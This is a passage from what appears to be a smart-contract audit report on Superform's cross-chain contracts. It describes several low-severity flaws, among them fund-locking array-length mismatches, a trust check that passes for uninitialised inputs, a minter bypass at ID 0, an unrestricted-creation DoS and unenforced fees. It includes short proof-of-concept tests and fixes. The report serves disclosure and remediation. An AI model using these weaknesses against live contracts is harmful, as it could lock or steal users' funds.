        uint256 payloadId_,
        bytes memory prevPayloadBody_,
        uint256[] calldata finalAmounts_
    )
        internal
        returns (bytes memory newPayloadBody_, PayloadState finalState_)
    {
        // ... existing logic ...

 >>     for (uint256 i; i < arrLen; ++i) {
            // Accessing hasDstSwaps[i] without validating the length can cause a revert
            // if hasDstSwaps is shorter than finalAmounts_.
 >>         if (multiVaultData.hasDstSwaps[i]) {
                // ... logic for handling destination swaps ...
            }
        }
    // ... existing logic ...
    }

```

- also if the length of `hasDstSwaps` is valid but length of `retain4626s` not (which also not validated in the srcChain), this will pass and the next step is the keeper calls [processPayload](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L147) , and this will trigger [\_multiDeposit](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L750) function. which will revert in case `retain4626s` length, less then `superFormsIds` when trying to call the superForm .

```js
 function _multiDeposit(uint256 payloadId_,bytes memory payload_,address srcSender_,uint64 srcChainId_)
        internal returns (bytes memory){
        InitMultiVaultData memory multiVaultData = abi.decode(payload_, (InitMultiVaultData));

        address[] memory superforms = DataLib.getSuperforms(multiVaultData.superformIds);

        IERC20 underlying;
        // length of superFormsIds from the srcChain..
   >>   uint256 numberOfVaults = multiVaultData.superformIds.length;
        bool fulfilment;
        bool errors;
        for (uint256 i; i < numberOfVaults; ++i) {
            // some code ..
                    // @audit-issue : if the len of retainerc4626 less then numberOfVaults. this always revert
                    try IBaseForm(superforms[i]).xChainDepositIntoVault(
                        InitSingleVaultData({
                            payloadId: multiVaultData.payloadId,
                            superformId: multiVaultData.superformIds[i],
                            amount: multiVaultData.amounts[i],
                            maxSlippage: multiVaultData.maxSlippages[i],
                            liqData: emptyRequest,
                            hasDstSwap: false,
        >>                  retain4626: multiVaultData.retain4626s[i],
                            receiverAddress: multiVaultData.receiverAddress,
                            extraFormData: multiVaultData.extraFormData
                        }),
                        srcSender_,
                        srcChainId_
                    ) returns (uint256 dstAmount) {
                       // handle success ..
                    } catch {
                       //catch error
                    }
                } else {
        }
   }

```

- in both cases ,the user's funds are effectively locked in the contract with no way to retrieve them, as the cross-chain deposit action cannot be processed Neither rescued (cause it's not stored as failedDeposit).
> `NOTE` that in case of direct deposit the transaction will revert and the user don't lose anything. it's the crossChain Mechanism that allows such a problem

- poc : 
- this is a simple test shows that trying to access an index that doesn't exist will panic with `0x32` : 
```js 
  struct InitMultiVaultData {
    // uint256 payloadId;
    uint256[] superformIds;
    uint256[] amounts;
    uint256[] maxSlippages;
    // LiqRequest[] liqData;
    bool[] hasDstSwaps;
    bool[] retain4626s;
    // address receiverAddress;
    // bytes extraFormData;
  }   
    
    function test_indexAcess() public {
       InitMultiVaultData memory exampleData = InitMultiVaultData({
    superformIds: new uint256[](6), // Array of 6 superform IDs
    amounts: new uint256[](6), // Array of 6 amounts
    maxSlippages: new uint256[](6), // Array of 6 max slippages
    hasDstSwaps: new bool[](4), // Array of 4 hasDstSwaps, should be 6
    retain4626s: new bool[](3) // Array of 3 retain4626s, should be 6
     }); 
     for (uint i ; i< exampleData.superformIds.length;i++){
        exampleData.hasDstSwaps[i];
     }
    }
```
- console : 
```sh 
  Traces:
  [1525] random::test_indexAcess()
    └─ ← panic: array out-of-bounds access (0x32)
```
- Impact : 
>  While user errors in providing input are regrettable, it is essential that transactions with improper inputs are systematically rejected, particularly because the protocol cross-chain mechanisms what enable such occurrences.

- If the lengths of the `hasDstSwaps` or `retain4626s` arrays are not equal to the length of the superformIds array, the action on the destination chain will revert when accessing an index that does not exist. This will prevent the multi-vault deposit action from being processed, and the user's funds will be stuck without the possibility of retrieval.
validation on chain.
- Recommendation : 
- To prevent this issue, the contract should include additional validation checks in the _validateSuperformsData function to ensure that the lengths of the hasDstSwaps and retain4626s arrays match the length of the superformIds array
```Diff
 function _validateSuperformsData(
    MultiVaultSFData memory superformsData_,
    uint64 dstChainId_,
    bool deposit_
)
    internal
    view
    virtual
    returns (bool)
{
    // ... existing validation logic ...

    // Additional length checks for hasDstSwaps and retain4626s
++    if (superformsData_.superformIds.length != superformsData_.hasDstSwaps.length ||
++        superformsData_.superformIds.length != superformsData_.retain4626s.length) {
++        return false;
++    }

    // ... existing validation logic ...
}
```



### `changeFormImplementationPauseStatus` can update status to wrong form implementations in other chains

**Severity:** Low risk

**Context:** [SuperformFactory.sol#L253-L261](superform-core/src/SuperformFactory.sol#L253-L261)

`changeFormImplementationPauseStatus` allows the emergency admin to notify other chains about the change in the status of a form implementation. However, there is currently no on-chain system that keeps the ids of all the form implementations in sync among chains. This can cause the wrong implementation to be updated in other chains by mistake or the transactions fail in destination chain if they do not exist.

It would be recommended either create a system to keep all ids in sync among different chains or not to allow broadcast messages for status updates.



### Lack of Event Emission in `addRemoteChain` function

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- **Severity**
Low

- **Relevant GitHub Links**
https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L433-L458

- **Summary**
The `addRemoteChain` function lacks event emission, hindering transparency and external tracking of significant state changes, such as the addition of remote chain configurations. Emitting events is crucial for enhancing the understanding of modifications to the contract's configuration.

- **Vulnerability Details**
In the `addRemoteChain` function, no event is emitted to signal the addition of a remote chain configuration. Emitting events for important state changes improves transparency and allows external parties to track modifications to the contract's configuration.

- **Impact**
The absence of an event emission in `addRemoteChain` doesn't pose a security threat, but it diminishes the transparency and user experience of the contract. Without events, it becomes challenging for external parties to monitor and react to changes in the contract's state.

- **Tools used**
- Manual review

- **Recommendations**
It is recommended to emit an event (`ChainConfigAdded`) in the `addRemoteChain` function to provide transparency and allow external parties to track the addition of remote chain configurations. Including events for all significant state changes enhances the usability and auditability of the contract.





### Uninitialized Source Chain ID and Empty Source Address Can Bypass Trust Verification in `CrossChainBridge.sol`

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- **Severity**
Low

- **Relevant GitHub Links**
https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L158-L160

- **Summary**
The function `isTrustedRemote` in the `LayerzeroImplementation.sol` contract has a potential issue where it doesn't verify whether `srcAddress_` is properly initialized. As a result, calling the function with an uninitialized source chain ID (`0`) and an empty source address would mistakenly return `true`, contrary to expectations.

- **Vulnerability Details**
In the `isTrustedRemote` function:
```solidity
function isTrustedRemote(uint16 srcChainId_, bytes calldata srcAddress_) external view returns (bool) {
    return keccak256(trustedRemoteLookup[srcChainId_]) == keccak256(srcAddress_);
}
```
The function relies on the default value of `trustedRemoteLookup[srcChainId_]` when the `srcChainId_` is uninitialized. If `srcChainId_` is `0` and an empty byte array (`"0x"`) is passed as `srcAddress_`, the function will return `true` because `keccak256(trustedRemoteLookup[0]) == keccak256("0x")` will be true.

- **Impact**
This vulnerability could lead to false positives in trust validation, allowing unauthorized or unintended entities to be treated as trusted sources. It might result in unexpected behavior and pose a security risk, especially when interacting with uninitialized or improperly initialized source chain IDs.

- **POC:**

```solidity
function testIsTrustedUninitialized() public {
   assertEq(layerzeroImplementation.isTrustedRemote(0, "0x"), true);
}
```

- **Tools Used**
- Manual review

- **Recommendations**
It is recommended to add an initialization check in the `isTrustedRemote` function to ensure proper verification of `srcAddress_` before trust validation. Enhancing this check will prevent unintended true-positive results when the source address is not properly initialized.

for example new code will look like this with proper checks:

```solidity
function isTrustedRemote(uint16 srcChainId_, bytes calldata srcAddress_) external view returns (bool) {
    bytes memory trustedSource = trustedRemoteLookup[srcChainId_];
    if (srcAddress_.length == 0 || trustedSource.length == 0) revert Bridge_TrustedRemoteUninitialized();   
    return keccak256(trustedSource) == keccak256(srcAddress_);
}
```



### SuperRegistry.setStateRegistryAddress() fails to check that registryId != 0. 

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:
SuperRegistry.setStateRegistryAddress() fails to check that registryId != 0.  The impact is that when such registryAddress is registered, it will be considered as invalid. 

Consider the function ``isValidStateRegistry()``, which considers ``registryAddress`` is invalid when the corresponding ``stateRegistryId`` is 0. Therefore, it is important for ``setStateRegistryAddress() `` to check that registryId != 0 during registration of a new ``registryAddress``. 

```javascript
   function isValidStateRegistry(address registryAddress_) external view override returns (bool valid_) {
        if (stateRegistryIds[registryAddress_] != 0) return true;

        return false;
    }
```

Similarly, setAmbAddress( ) fails to check that ambId_ !=0. at the same time, when ambId = 0, it will be considered as an invalid AmbImpl:

```javascript

    function isValidAmbImpl(address ambAddress_) external view override returns (bool valid_) {
        uint8 ambId = ambIds[ambAddress_];
        if (ambId != 0 && !isBroadcastAMB[ambId]) return true;

        return false;
    }

    /// @inheritdoc ISuperRegistry
    function isValidBroadcastAmbImpl(address ambAddress_) external view override returns (bool valid_) {
        uint8 ambId = ambIds[ambAddress_];
        if (ambId != 0 && isBroadcastAMB[ambId]) return true;

        return false;
    }
```


**Recommendation**:
``setStateRegistryAddress() `` needs to check that registryId != 0 during its registration of a new ``registryAddress``. 

setAmbAddress( )  needs to check that ambId_ !=0



### Hyperlane `handle()` will fail to receive MsgValue messages from the relayers

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:
`handle()` will fail to receive MsgValue messages from the relayers due to missing of the `payable` modifier.

`HyperlaneImplementation.handle()` function should be `payable` so it can receive messages from the relayers properly which are along some mgs.value

```solidity
    function handle(uint32 origin_, bytes32 sender_, bytes calldata body_) external override onlyMailbox { ///@audit-issue function not payable!
    .....
    }
```

**PoC**:
1) In the Hyperlane docs, `handle` is marked payable: https://v3.hyperlane.xyz/docs/reference/messaging/receive#handle
2) In the Hyperlane's IMessageRecipient Interface Implementation, Handle is payable as well: https://github.com/hyperlane-xyz/hyperlane-monorepo/blob/79c96d718786079c5e0ecffb7eff3a1d55cf338b/solidity/contracts/interfaces/IMessageRecipient.sol#L9C10-L9C10

**Recommendation**:
Add `payable` modifier in the `HyperlaneImplementation.handle()` function:
```diff
-  function handle(uint32 origin_, bytes32 sender_, bytes calldata body_) external override onlyMailbox { 
+  function handle(uint32 origin_, bytes32 sender_, bytes calldata body_) external payable override onlyMailbox { 
    .....
    }
``



### PaymentHelper calculates ack costs even when user don't want to mint super position tokens

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Proof of Concept
PaymentHelper contract is used by user to get estimates about costs of their tx, so later user can provide enough funds to execute needed txs on both chains.

Let's look into `estimateMultiDstMultiVault` function for example. This function [calculates ack costs](https://github.com/superform-xyz/superform-core/blob/main/src/payments/PaymentHelper.sol#L170). As comments state it calculates it optimistically, which means that deposit or withdrawal doesn't fail on destination. That's why it is calculated for deposit only. 

But this function doesn't account the fact that user may retain deposited shares on destination chain. In this case there will be no need to send ack back to source chain and mint superposition tokens. And as result no ack costs should be covered.

Such a problems exists in all estimate functions as they all use same logic.
- Impact
User overpays for the tx.
- Recommended Mitigation Steps
Check if user is going to mint super positions or no and don't calculate ack costs in case if he is going to not mint super positions.



### Anyone will have minter role for the superforms that are constructed upon implementation with id 0. 

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Proof of Concept
SuperPositions.onlyMinter modifier is used to allow minting of tokens.

https://github.com/superform-xyz/superform-core/blob/main/src/SuperPositions.sol#L69-L83
```solidity
    modifier onlyMinter(uint256 superformId) {
        address router = superRegistry.getAddress(keccak256("SUPERFORM_ROUTER"));

        /// if msg.sender isn't superformRouter then it must be state registry for that superform
        if (msg.sender != router) {
            (, uint32 formBeaconId,) = DataLib.getSuperform(superformId);
            uint8 registryId = superRegistry.getStateRegistryId(msg.sender);

            if (uint32(registryId) != formBeaconId) {
                revert Error.NOT_MINTER();
            }
        }


        _;
    }
```

In case if caller is not router, then `formBeaconId` is fetched from `superformId`. And in case if registryId of msg.sender equal to `formBeaconId`, then minting is allowed.

`superRegistry.getStateRegistryId` will just return 0 for msg.sender that is not stored in the registry. This means that in case if there will be form implementation with id 0, then anyone will be able to mint tokens for superforms that use it.
- Impact
Anyone will have minter role for the superforms that are constructed upon implementation with id 0. 
- Recommended Mitigation Steps
Add check that `registryId` is not 0.



### `createSuperform` can be abused to cause DOS

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:


The `SuperformFactory` contract allows arbitrary address calls in the `createSuperform` function, allowing attackers to create a large number of invalid Superforms, causing blocking when calling `getAllSuperforms`.

- The `createSuperform` function is public, there is no caller judgment, and it can be called from any address.
- An attacker can create a large number of invalid Superforms by passing in different `vault` addresses.
- This will result in a lot of invalid data in the `superforms` array.
- When calling `getAllSuperforms`, you need to traverse the entire superforms array, because too much invalid data may cause insufficient gas and txn failure.



- poc
File: test\unit\superform-factory\superform-factory.createSuperforms.t.sol
```
function test_revert_createSuperform_Dos() public {
      vm.startPrank(deployer);

      vm.selectFork(FORKS[chainId]);

      address superRegistry = getContract(chainId, "SuperRegistry");

      for(uint32 i = 0;i < 50;i++){ // Use the transformation of formImplementationId to create multiple superform contracts. Different vault addresses can be used to create multiple superform contracts on the real chain.
          /// @dev Deploying Forms
          address  formImplementation = address(new ERC4626Form(superRegistry));
          uint32  formImplementationId = i+20;

          // Deploying Forms Using AddImplementation. Not Testing Reverts As Already Tested
          SuperformFactory(getContract(chainId, "SuperformFactory")).addFormImplementation(
              formImplementation, formImplementationId
          );
          SuperformFactory(getContract(chainId, "SuperformFactory")).createSuperform(formImplementationId, vault);
      }

      UtilityArgs memory vars;
      /// @dev testing the getAllSuperforms function
      (vars.superformIds_, vars.superforms_) =
          SuperformFactory(getContract(chainId, "SuperformFactory")).getAllSuperforms();

  }

When superformIds_.length==5, the gas consumption is as follows
forge test --match-test test_revert_createSuperform_Dos  -vvv  --gas-report
| src/SuperformFactory.sol:SuperformFactory contract |                 |        |        |        |         |
|----------------------------------------------------|-----------------|--------|--------|--------|---------|
| Deployment Cost                                    | Deployment Size |        |        |        |         |
| 2367342                                            | 12314           |        |        |        |         |
| Function Name                                      | min             | avg    | median | max    | - calls |
| addFormImplementation                              | 57785           | 63526  | 57895  | 79685  | 23      |
| createSuperform                                    | 230471          | 274903 | 274294 | 320424 | 167     |
| getAllSuperforms                                   | 34912           | 34912  | 34912  | 34912  | 1       |


When superformIds_.length==50, the gas consumption is as follows
forge test --match-test test_revert_createSuperform_Dos  -vvv  --gas-report
| src/SuperformFactory.sol:SuperformFactory contract |                 |        |        |        |         |
|----------------------------------------------------|-----------------|--------|--------|--------|---------|
| Deployment Cost                                    | Deployment Size |        |        |        |         |
| 2367342                                            | 12314           |        |        |        |         |
| Function Name                                      | min             | avg    | median | max    | - calls |
| addFormImplementation                              | 57785           | 59727  | 57785  | 79685  | 68      |
| createSuperform                                    | 230471          | 265471 | 274294 | 320424 | 212     |
| getAllSuperforms                                   | 82052           | 82052  | 82052  | 82052  | 1       |
```

Consider the gas upper limit settings on different chains, such as the arb chain. And considering that the growth of the `superformIds` array is indeed a problem worth considering as the project grows in time, I think this question is valid

**Recommendation**:

1.Add access control in createSuperform to only allow calls from authorized addresses.

2.Limit the number of Superforms created in a single vault.



### Users who accidentally specify a invalid `superformId` in crosschain deposits will result in lost funds

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:

**This is an intended behaviour but still a bad practice, the user could do this accidentally, plus the protocol won't benefit from this stuck funds neither.**

The `SuperformFactory` of each chain only tracks the `superformId` of the forms created in that specificchain. Therefore, the contract can only check if the superform exists before performing the whole operation in the direct deposits.  In the case of the crosschain deposits, there's no way if the operation is gonna fail due to a non-existant `superformId` at first glance:

```solidity
// only knows if it exists if it's a direct deposit
 if (dstChainId_ == CHAIN_ID && !factory_.isSuperform(superformId_)) {
            return false;
  }
// it will pass this one too, since the default value for that mapping is NON_PAUSED
 if (isDeposit_ && factory_.isFormImplementationPaused(formImplementationId)) return false;
//...


```

This means that if a user specifies a `superformId` that doesn't exist in the desintation chain the first crosschain transaction could go through. The user would pay for the gas required for the AMBs to dispatch the payload (could be very expensive if the source chain is mainnet) and finally get his funds stuck in the destination `CoreStateRegistry` . This would happen in the `updateDepositPayload` function: 


```solidity

if (
                !(
                    ISuperformFactory(_getAddress(keccak256("SUPERFORM_FACTORY"))).isSuperform(superformId_)
                        && finalState_ == PayloadState.UPDATED
                )
            ) {
                failedDeposits[payloadId_].superformIds.push(superformId_);

                address asset;
                try IBaseForm(_getSuperform(superformId_)).getVaultAsset() returns (address asset_) {
                    asset = asset_;
                } catch {
                    /// @dev if its error, we just consider asset as zero address
                }
                /// @dev if superform is invalid, try catch will fail and asset pushed is address (0)
                /// @notice this means that if a user tries to game the protocol with an invalid superformId, the funds
                /// bridged over that failed will be stuck here
                failedDeposits[payloadId_].settlementToken.push(asset);
                failedDeposits[payloadId_].settleFromDstSwapper.push(false);

                /// @dev sets amount to zero and will mark the payload as PROCESSED (overriding the previous memory
                /// settings)
                amount_ = 0;
                finalState_ = PayloadState.PROCESSED;
```
Even considering that users will interact with the contracts from the frontend and params will be set from the Superform API a frontend attack could modify the params or smart contracts interacting with the contracts directly on-chain could make a mistake.

**Recommendation**:
Broadcast the transaction when a superform is created,so all the factories are up to date with the existing superforms. This is not a problem since the `superformId` cannot collide: their chainId makes their Id unique. This would add an extra robustness layer and paramters sanity, reverting at the beginning of the operation so the user cannot lead his tokens to being stuck forever. Another option is to add a admin role `skim` function in the `CoreStateRegistry`so lost  funds can be withdrawn.




### `disputeRescueFailedDeposits` & `proposeRescueFailedDeposits` should not both be possible in the block where delay is reached

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:

failed cross chain deposits can be rescued via the designed rescue process. First, rescuer will provide the amounts and set `lastProposedTimestamp` so user can finalize the rescue. the deposits by calling `finalizeRescueFailedDeposits` once the delay is passed.

https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L208-L243

```solidity
    function proposeRescueFailedDeposits(uint256 payloadId_, uint256[] calldata proposedAmounts_) external override {
        /// @dev validates the caller
        _onlyAllowedCaller(keccak256("CORE_STATE_REGISTRY_RESCUER_ROLE"));

        /// @dev validates the payload id
        _validatePayloadId(payloadId_);

        FailedDeposit storage failedDeposits_ = failedDeposits[payloadId_];

        if (
            failedDeposits_.superformIds.length == 0 || proposedAmounts_.length == 0
                || failedDeposits_.superformIds.length != proposedAmounts_.length
        ) {
            revert Error.INVALID_RESCUE_DATA();
        }

        if (failedDeposits_.lastProposedTimestamp != 0) {
            revert Error.RESCUE_ALREADY_PROPOSED();
        }

        /// @dev note: should set this value to dstSwapper.failedSwap().amount for interim rescue
        failedDeposits[payloadId_].amounts = proposedAmounts_;
        failedDeposits[payloadId_].lastProposedTimestamp = block.timestamp;

        (,, uint8 multi,,,) = DataLib.decodeTxInfo(payloadHeader[payloadId_]);

        address refundAddress;
        if (multi == 1) {
            refundAddress = abi.decode(payloadBody[payloadId_], (InitMultiVaultData)).receiverAddress;
        } else {
            refundAddress = abi.decode(payloadBody[payloadId_], (InitSingleVaultData)).receiverAddress;
        }

        failedDeposits[payloadId_].refundAddress = refundAddress;
        emit RescueProposed(payloadId_, failedDeposits_.superformIds, proposedAmounts_, block.timestamp);
    }
```

When delay is passed, users then can finalize the rescue the deposits by calling `finalizeRescueFailedDeposits`.

https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L279-L313

```solidity
    function finalizeRescueFailedDeposits(uint256 payloadId_) external override {
        /// @dev validates the payload id
        _validatePayloadId(payloadId_);

        FailedDeposit storage failedDeposits_ = failedDeposits[payloadId_];

        /// @dev the timelock is elapsed
        if (
            failedDeposits_.lastProposedTimestamp == 0
>>>             || block.timestamp < failedDeposits_.lastProposedTimestamp + _getDelay()
        ) {
            revert Error.RESCUE_LOCKED();
        }

        /// @dev set to zero to prevent re-entrancy
        failedDeposits_.lastProposedTimestamp = 0;
        IDstSwapper dstSwapper = IDstSwapper(_getAddress(keccak256("DST_SWAPPER")));

        uint256 len = failedDeposits_.amounts.length;
        for (uint256 i; i < len; ++i) {
            /// @dev refunds the amount to user specified refund address
            if (failedDeposits_.settleFromDstSwapper[i]) {
                dstSwapper.processFailedTx(
                    failedDeposits_.refundAddress, failedDeposits_.settlementToken[i], failedDeposits_.amounts[i]
                );
            } else {
                IERC20(failedDeposits_.settlementToken[i]).safeTransfer(
                    failedDeposits_.refundAddress, failedDeposits_.amounts[i]
                );
            }
        }

        delete failedDeposits[payloadId_];
        emit RescueFinalized(payloadId_);
    }
```

However, `disputeRescueFailedDeposits` can still be called when `block.timestamp` is equal to `failedDeposits_.lastProposedTimestamp + _getDelay()`, where it supposed to be the start of the finalize period and dispute should not be allowed anymore.

https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L246-L275

```solidity
    function disputeRescueFailedDeposits(uint256 payloadId_) external override {
        /// @dev validates the payload id
        _validatePayloadId(payloadId_);

        FailedDeposit storage failedDeposits_ = failedDeposits[payloadId_];

        /// @dev the msg sender should be the refund address (or) the disputer
        if (
            !(
                msg.sender == failedDeposits_.refundAddress
                    || _hasRole(keccak256("CORE_STATE_REGISTRY_DISPUTER_ROLE"), msg.sender)
            )
        ) {
            revert Error.NOT_VALID_DISPUTER();
        }

        /// @dev the timelock is already elapsed to dispute
        if (
            failedDeposits_.lastProposedTimestamp == 0
>>>             || block.timestamp > failedDeposits_.lastProposedTimestamp + _getDelay()
        ) {
            revert Error.DISPUTE_TIME_ELAPSED();
        }

        /// @dev just can reset last proposed time here, since amounts should be updated again to
        /// pass the lastProposedTimestamp zero check in finalize
        failedDeposits[payloadId_].lastProposedTimestamp = 0;

        emit RescueDisputed(payloadId_);
    }
```

This could break user expectation as when the delay is passed, disputer can still dispute users failed deposits.

**Recommendation**:

Modify the check, when the delay is reached, `disputeRescueFailedDeposits` should be revert as the dispute time have already passed.

```diff
    function disputeRescueFailedDeposits(uint256 payloadId_) external override {
        /// @dev validates the payload id
        _validatePayloadId(payloadId_);

        FailedDeposit storage failedDeposits_ = failedDeposits[payloadId_];

        /// @dev the msg sender should be the refund address (or) the disputer
        if (
            !(
                msg.sender == failedDeposits_.refundAddress
                    || _hasRole(keccak256("CORE_STATE_REGISTRY_DISPUTER_ROLE"), msg.sender)
            )
        ) {
            revert Error.NOT_VALID_DISPUTER();
        }

        /// @dev the timelock is already elapsed to dispute
        if (
            failedDeposits_.lastProposedTimestamp == 0
-                || block.timestamp > failedDeposits_.lastProposedTimestamp + _getDelay()
+                || block.timestamp >= failedDeposits_.lastProposedTimestamp + _getDelay()
        ) {
            revert Error.DISPUTE_TIME_ELAPSED();
        }

        /// @dev just can reset last proposed time here, since amounts should be updated again to
        /// pass the lastProposedTimestamp zero check in finalize
        failedDeposits[payloadId_].lastProposedTimestamp = 0;

        emit RescueDisputed(payloadId_);
    }
```

Or modify `proposeRescueFailedDeposits` time check, depend on the intended behaviors.



### Fees not paid properly when cross-chain operations are performed

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:

When users initiate cross-chain operations (deposit/withdraw), it will eventually calculate the required fees for each amb and extra data, based on the list of ambs and the message, then trigger core state registry's `dispatchPayload` and provide the fees.

https://github.com/superform-xyz/superform-core/blob/main/src/BaseRouterImplementation.sol#L525-L549

```solidity
    function _dispatchAmbMessage(DispatchAMBMessageVars memory vars_) internal virtual {
        AMBMessage memory ambMessage = AMBMessage(
            DataLib.packTxInfo(
                uint8(vars_.txType),
                uint8(CallbackType.INIT),
                vars_.multiVaults,
                STATE_REGISTRY_TYPE,
                vars_.srcSender,
                vars_.srcChainId
            ),
            vars_.ambData
        );

>>>     (uint256 fees, bytes memory extraData) = IPaymentHelper(superRegistry.getAddress(keccak256("PAYMENT_HELPER")))
            .calculateAMBData(vars_.dstChainId, vars_.ambIds, abi.encode(ambMessage));

        ISuperPositions(superRegistry.getAddress(keccak256("SUPER_POSITIONS"))).updateTxHistory(
            vars_.currentPayloadId, ambMessage.txInfo
        );

        /// @dev this call dispatches the message to the AMB bridge through dispatchPayload
>>>     IBaseStateRegistry(superRegistry.getAddress(keccak256("CORE_STATE_REGISTRY"))).dispatchPayload{ value: fees }(
            vars_.srcSender, vars_.ambIds, vars_.dstChainId, abi.encode(ambMessage), extraData
        );
    }
```

The problem is, that this is the only enforced fee users have to pay, while the other process of cross-chain deposit/withdraw also requires fee/gas to operate. For cross-chain deposit, it needs to consider update cost (dst chain), ack processing cost (operations is failed/return, in src chain), swap cost (if any, in dst chain), and execution/processing cost (dst chain). while for cross-chain withdraw, it needs to consider execution/processing cost (dst chain) and ack processing cost (operations is failed/return, in src chain).

While routers will trigger `_forwardPayment` in the end of every call, it still not checked the forwarded payment meet the required values.

https://github.com/superform-xyz/superform-core/blob/main/src/BaseRouterImplementation.sol#L863-L872

```solidity
    function _forwardPayment(uint256 _balanceBefore) internal virtual {
        /// @dev deducts what's already available sends what's left in msg.value to payment collector
        uint256 residualPayment = address(this).balance - _balanceBefore;

        if (residualPayment != 0) {
            IPayMaster(superRegistry.getAddress(keccak256("PAYMASTER"))).makePayment{ value: residualPayment }(
                msg.sender
            );
        }
    }
```

This will allow user to not pay for the rest of processing cost.
 
**Recommendation**:

Add the proper fee check for each of operations, and make sure the payment to pay master is at least reach the minimum value of the required processing value.



### `estimateMultiDstMultiVault` and `estimateMultiDstSingleVault` assume all input are cross-chain transaction.

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:

`PaymentHelper`'s `estimateMultiDstSingleVault` and `estimateMultiDstMultiVault` is a function that is needed to calculate the fees required for users when calling routers operations. 

https://github.com/superform-xyz/superform-core/blob/main/src/payments/PaymentHelper.sol#L139-L198

```solidity
    function estimateMultiDstMultiVault(
        MultiDstMultiVaultStateReq calldata req_,
        bool isDeposit_
    )
        external
        view
        override
        returns (uint256 liqAmount, uint256 srcAmount, uint256 dstAmount, uint256 totalAmount)
    {
        uint256 len = req_.dstChainIds.length;
        uint256 superformIdsLen;
        uint256 totalDstGas;

        for (uint256 i; i < len; ++i) {
            totalDstGas = 0;

            /// @dev step 1: estimate amb costs
            uint256 ambFees = _estimateAMBFees(
                req_.ambIds[i], req_.dstChainIds[i], _generateMultiVaultMessage(req_.superformsData[i])
            );

            superformIdsLen = req_.superformsData[i].superformIds.length;

            srcAmount += ambFees;

            if (isDeposit_) {
                /// @dev step 2: estimate update cost (only for deposit)
                totalDstGas += _estimateUpdateCost(req_.dstChainIds[i], superformIdsLen);

                /// @dev step 3: estimation processing cost of acknowledgement
                /// @notice optimistically estimating. (Ideal case scenario: no failed deposits / withdrawals)
                srcAmount += _estimateAckProcessingCost(superformIdsLen);

                /// @dev step 4: estimate liq amount
                liqAmount += _estimateLiqAmount(req_.superformsData[i].liqRequests);

                /// @dev step 5: estimate dst swap cost if it exists
                totalDstGas += _estimateSwapFees(req_.dstChainIds[i], req_.superformsData[i].hasDstSwaps);
            }

            /// @dev step 6: estimate execution costs in dst (withdraw / deposit)
            /// note: execution cost includes acknowledgement messaging cost
            totalDstGas += _estimateDstExecutionCost(isDeposit_, req_.dstChainIds[i], superformIdsLen);

            /// @dev step 6: estimate if timelock form processing costs are involved
            if (!isDeposit_) {
                for (uint256 j; j < superformIdsLen; ++j) {
                    (, uint32 formId,) = req_.superformsData[i].superformIds[j].getSuperform();
                    if (formId == TIMELOCK_FORM_ID) {
                        totalDstGas += timelockCost[req_.dstChainIds[i]];
                    }
                }
            }

            /// @dev step 7: convert all dst gas estimates to src chain estimate  (withdraw / deposit)
            dstAmount += _convertToNativeFee(req_.dstChainIds[i], totalDstGas);
        }

        totalAmount = srcAmount + dstAmount + liqAmount;
    }
```

https://github.com/superform-xyz/superform-core/blob/main/src/payments/PaymentHelper.sol#L201-L251

```solidity
    function estimateMultiDstSingleVault(
        MultiDstSingleVaultStateReq calldata req_,
        bool isDeposit_
    )
        external
        view
        override
        returns (uint256 liqAmount, uint256 srcAmount, uint256 dstAmount, uint256 totalAmount)
    {
        uint256 len = req_.dstChainIds.length;
        for (uint256 i; i < len; ++i) {
            uint256 totalDstGas;

            /// @dev step 1: estimate amb costs
            uint256 ambFees = _estimateAMBFees(
                req_.ambIds[i], req_.dstChainIds[i], _generateSingleVaultMessage(req_.superformsData[i])
            );

            srcAmount += ambFees;

            if (isDeposit_) {
                /// @dev step 2: estimate update cost (only for deposit)
                totalDstGas += _estimateUpdateCost(req_.dstChainIds[i], 1);

                /// @dev step 3: estimation execution cost of acknowledgement
                srcAmount += _estimateAckProcessingCost(1);

                /// @dev step 4: estimate the liqAmount
                liqAmount += _estimateLiqAmount(req_.superformsData[i].liqRequest.castLiqRequestToArray());

                /// @dev step 5: estimate if swap costs are involved
                totalDstGas +=
                    _estimateSwapFees(req_.dstChainIds[i], req_.superformsData[i].hasDstSwap.castBoolToArray());
            }

            /// @dev step 5: estimate execution costs in dst
            /// note: execution cost includes acknowledgement messaging cost
            totalDstGas += _estimateDstExecutionCost(isDeposit_, req_.dstChainIds[i], 1);

            /// @dev step 6: estimate if timelock form processing costs are involved
            (, uint32 formId,) = req_.superformsData[i].superformId.getSuperform();
            if (!isDeposit_ && formId == TIMELOCK_FORM_ID) {
                totalDstGas += timelockCost[req_.dstChainIds[i]];
            }

            /// @dev step 7: convert all dst gas estimates to src chain estimate
            dstAmount += _convertToNativeFee(req_.dstChainIds[i], totalDstGas);
        }

        totalAmount = srcAmount + dstAmount + liqAmount;
    }
```

However, this function assume that all of the request provided is cross-chain request. While inside router, it is possible that multi destination and multi vault operations provided with the same-chain (direct) operations.

https://github.com/superform-xyz/superform-core/blob/main/src/SuperformRouter.sol#L73-L93

```solidity
